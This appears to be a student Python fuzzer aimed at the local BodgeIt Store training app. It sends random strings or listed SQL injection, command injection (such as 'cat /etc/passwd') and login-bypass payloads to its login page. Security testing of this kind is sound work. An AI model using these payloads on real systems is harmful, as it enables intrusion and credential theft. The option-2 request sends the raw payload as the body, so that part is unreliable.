# AE Fuzzer Project for BodgeIt Store

import os
import time
import random
import requests

os.system("cls")

while True:
    option = int(input("Send random string or SQLi/XSS commands? (1 or 2) "))

    if option == 1:
        length = int(input("\nEnter string length: "))
        parameter = ""
        for i in range(length):
            j = random.randint(32, 126)
            parameter += chr(j)

        print("\nSending random string of length " + str(length) + " to BodgeIt Store...")
        pload = {'username':parameter,'password':'password', 'Login':'Login'}
        r = requests.post("http://127.0.0.1:8080/bodgeit/login.jsp", data=pload)
        print("\nMessage successfully sent..\n")
        time.sleep(1)

        print("Server response:\n" + r.text)
        print("Status Code: " + str(r.status_code))


    elif option == 2:
        commands = ["something%0Acat%20/etc/passwd", "ping%PROGRAMFILES:~10,-5%IP", "ping%CommonProgramFiles:~10,-18%IP", "%%2727", "%25%27", "`+HERP", "'+'herp",
                    "' 'DERP", "'%20'HERP", "'%2B'HERP", "page.asp?id=1 or 1=1 -- true", "page.asp?id=1' or 1=1 -- true", "page.asp?id=1\" or 1=1 -- true", 
                    "page.asp?id=1 and 1=2 -- false", "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "admin' or '1'='1'/*",
                    "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\", \"?id=1%0Band%0B1=1%0B--", ""]
        index = random.randint(0, len(commands)-1)
        command = commands[index]
        #command = commands[len(commands)-1]
        
        print("\nSending \"" + command + "\"" + " to BodgeIt Store...")
        r = requests.post("http://127.0.0.1:8080/bodgeit/login.jsp", data=command)
        print("\nCommand successfully sent..\n")
        time.sleep(1)
        
        print("Server response:\n" + r.text)
        print("Status Code: " + str(r.status_code))

    
    else:
        continue

    again = int(input("\nSend another response? (1 for no, 2 for yes) "))
    if again != 2:
        break
    else:
        os.system("cls")




